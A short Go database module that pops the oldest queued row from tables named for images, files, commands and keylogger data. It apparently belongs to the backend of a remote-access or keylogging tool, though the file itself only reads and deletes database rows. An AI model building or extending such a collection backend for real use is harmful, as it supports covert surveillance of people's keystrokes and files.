package db

import (
	"database/sql"
	"errors"
	"fmt"
	"time"
)

func readOneRow(db *sql.DB, table string) (string, []byte, time.Time, error) {
	rawQuery := "SELECT request_id, data, exec_time FROM %s WHERE exec_time = (SELECT MIN(exec_time) FROM %s) LIMIT 1"
	query := fmt.Sprintf(rawQuery, table, table)
	row := db.QueryRow(query)

	var requestID string
	var data []byte
	var execTime time.Time
	err := row.Scan(&requestID, &data, &execTime)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", nil, time.Time{}, nil // No data
		}
		return "", nil, time.Time{}, err
	}
	err = removeOneRow(db, table, requestID)
	if err != nil {
		return "", nil, time.Time{}, err
	}
	return requestID, data, execTime, nil
}

func ReadOldestImage(db *sql.DB) (string, []byte, time.Time, error) {
	return readOneRow(db, TABLE_IMAGES)
}

func ReadOldestFile(db *sql.DB) (string, []byte, time.Time, error) {
	return readOneRow(db, TABLE_FILES)
}

func ReadOldestCommand(db *sql.DB) (string, []byte, time.Time, error) {
	return readOneRow(db, TABLE_COMMANDS)
}

func ReadOldestKeylogger(db *sql.DB) (string, []byte, time.Time, error) {
	return readOneRow(db, TABLE_KEYLOGS)
}
